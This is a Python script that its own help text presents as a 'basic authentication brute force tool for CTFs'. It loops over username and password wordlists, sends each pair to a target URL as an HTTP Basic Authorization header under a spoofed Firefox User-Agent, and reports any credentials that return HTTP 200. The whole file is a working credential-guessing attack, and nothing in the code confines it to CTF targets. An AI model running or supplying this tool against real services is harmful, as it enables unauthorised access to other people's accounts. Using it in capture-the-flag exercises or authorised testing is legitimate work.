#!/usr/bin/env python3
# -*- coding: utf-8 -*-


import requests
import argparse
import base64
import time
import os

parser = argparse.ArgumentParser(
    description="Basic authentication brute force tool for CTFs",
    usage="python basic_auth.py --target <url> --user [username file] --pass [password file]"
)
parser.add_argument('--target', dest='url', required=True, help="The target address")
parser.add_argument("--user", dest="usernames", required=True, help="Path to username file")
parser.add_argument("--pass", dest="passwords", required=True, help="Path to password file")
parser.add_argument("--delay", dest="delay", type=float, default=0.1, help="Delay between requests")

args = parser.parse_args()

class Brute():
    def __init__(self, args):
        self.usernames_file = args.usernames
        self.passwords_file = args.passwords
        self.target = args.url
        self.delay = args.delay
    
    def generate_creds(self):
        # Validate files exist
        if not os.path.exists(self.usernames_file):
            print(f"Error: Username file '{self.usernames_file}' not found")
            return
        
        if not os.path.exists(self.passwords_file):
            print(f"Error: Password file '{self.passwords_file}' not found")
            return
        
        try:
            with open(self.usernames_file, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            with open(self.passwords_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except IOError as e:
            print(f"Error reading files: {e}")
            return
        
        print(f"Loaded {len(usernames)} usernames and {len(passwords)} passwords")
        
        for name in usernames:
            for passwd in passwords:
                print(f"Trying: {name}:{passwd}")
                if self.auth(name, passwd):
                    print("Valid credentials found! Stopping...")
                    return
                time.sleep(self.delay)
    
    def auth(self, username, password):
        credentials = f"{username}:{password}"
        encoded_credentials = base64.b64encode(credentials.encode()).decode()
        
        headers = {
            'Authorization': f'Basic {encoded_credentials}',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:143.0) Gecko/20100101 Firefox/143.0'
        }
        
        try:
            response = requests.get(
                self.target,
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[SUCCESS] {username}:{password}")
                print(f"Authorization: Basic {encoded_credentials}")
                return True
            elif response.status_code == 401:
                print(f"[FAILED] {username}:{password} (401 Unauthorized)")
                return False
            else:
                print(f"[UNKNOWN] {username}:{password} (Status: {response.status_code})")
                return False
                
        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
            return False
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            return False

if __name__ == "__main__":
    brute = Brute(args)
    brute.generate_creds()